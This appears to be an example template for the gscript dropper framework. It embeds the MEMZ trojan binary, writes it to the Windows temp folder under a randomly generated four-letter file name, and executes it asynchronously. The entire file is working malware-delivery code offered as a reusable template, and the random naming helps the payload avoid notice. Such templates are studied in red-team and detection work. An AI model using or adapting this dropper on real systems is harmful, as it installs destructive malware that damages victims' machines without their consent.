// Example gscript template
// Title: Memz Example
// Author: ahhh
// Purpose: Drops Memz as an asset and executes it async
// Gscript version: 1.0.0
// ATT&CK: 

//priority:150
//timeout:150
//import:/private/tmp/memz.exe

//go_import:os as os2

function Deploy() {  
	
    console.log("Starting to drop memz binary");
    // Getting our asset
    var memzBin = GetAssetAsBytes("memz.exe");
    console.log("errors: "+memzBin[1]);

    // Getting a random string
    var temppath = os2.TempDir();
    var naming = G.rand.GetAlphaString(4);
    naming = naming.toLowerCase();
    var fullpath = temppath+"\\"+naming+".exe";
    console.log("file name: "+ fullpath);

    // Write payload
    errors = G.file.WriteFileFromBytes(fullpath, memzBin[0]);
    console.log("errors: "+errors);

    // Run payload
    var running = G.exec.ExecuteCommandAsync(fullpath, [""]);
    console.log("errors: "+running[1]);

    return true
}